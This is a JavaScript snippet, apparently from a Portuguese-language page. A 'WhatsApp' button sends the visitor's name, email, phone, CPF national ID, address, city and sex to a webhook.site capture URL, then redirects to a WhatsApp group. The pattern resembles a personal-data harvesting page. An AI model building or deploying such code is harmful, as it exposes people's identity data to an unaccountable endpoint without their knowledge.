document.getElementById("whatsapp-btn").addEventListener("click", async () => {
  const data = {
    nome: document.getElementById("nome").value,
    email: document.getElementById("email").value,
    telefone: document.getElementById("telefone").value,
    cpf: document.getElementById("cpf").value,
    endereco: document.getElementById("endereco").value,
    cidade: document.getElementById("cidade").value,
    sexo: document.getElementById("sexo").value
  };

  const jsonData = JSON.stringify(data);

  try {
    await fetch("https://webhook.site/232aa86c-3c54-4b9b-9b8e-f0947e8c5c2d", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: jsonData
    });

    window.location.href = "https://chat.whatsapp.com/KMMBtNoL6ZNEgoh4JM2eBC";

  } catch (error) {
    alert("Erro ao enviar dados. Tente novamente.");
    console.error(error);
    window.location.href = "https://chat.whatsapp.com/KMMBtNoL6ZNEgoh4JM2eBC";
  }
});